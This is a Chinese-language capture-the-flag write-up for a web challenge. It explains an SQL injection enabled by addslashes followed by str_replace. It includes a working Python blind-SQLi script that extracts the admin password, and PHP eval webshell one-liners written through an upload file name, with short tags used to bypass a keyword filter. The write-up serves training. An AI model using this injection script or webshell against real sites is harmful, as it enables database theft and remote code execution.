![image-20250913111029375](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250913111029375.png)

老规矩看到登录框先试试简单的sql注入，发现没有其他额外信息，估计就不太可能是简单的sql注入了。首先进行信息收集，html没有什么注释的提示，那就目录扫描。首先看robots.txt：

```
User-agent: *
Disallow: *.php.bak
```

很明显是找备份文件了，我这里没有扫描，直接找index.php.bak，发现不存在。抓包的时候发现用户名密码是提交到了user.php，我们访问user.php.bak，发现也不存在。抓包时候发现还要向image.php请求猫猫图片，我们找一下image.php.bak，成功找到：

```php
<﻿?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

这里的关键在于先进行了addslashes然后又str_replace

如果上传\0，那么过程是  \0  ->  \\\0   ->   \

这就过滤出一个单独的反斜杠，这个反斜杠可以转义id的右边的'，使得id的结束'变成path的左边的'

`select * from images where id=' \' or path= '     {$path}'`

那么我们输入的path就可以插入额外的sql语句了

比如：`image.php?id=\0&path=or%201=1%23`这样也能显示出图片

因为这里只返回/不返回图片，所以用sql盲注，这里只给出最后爆密码的python脚本：

```python
import  requests
url = "http://eba63dae-3cf2-4f30-8b24-2d0e21aca58a.node5.buuoj.cn:81/image.php?id=\\0&path="
payload = " or ascii(substr((select password from users),{},1))>{}%23"
result = ''
for i in range(1,100):
    high = 127
    low = 32
    mid = (low+high) // 2
    # print(mid)
    while(high>low):
        r = requests.get(url + payload.format(i,mid))
       # print(url + payload.format(i,mid))
        if 'JFIF' in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    result += chr(mid)
    print(result)
```

爆出来用户名(admin)密码，登录之后可以上传文件。

![image-20250913114832937](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250913114832937.png)

我们随便上传一个普通文件，给出了

![image-20250913134711410](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250913134711410.png)

这是一个php的日志文件，记录了上传的文件名。我们想到可以通过文件名写webshell

`<?php @eval($_POST[cmd]);?>`

上传后发现关键字php被过滤，那我们用短标签

`<?= @eval($_POST[cmd]);?>`

日志文件中就包含了我们写入的语句，用蚁剑连上，读取/flag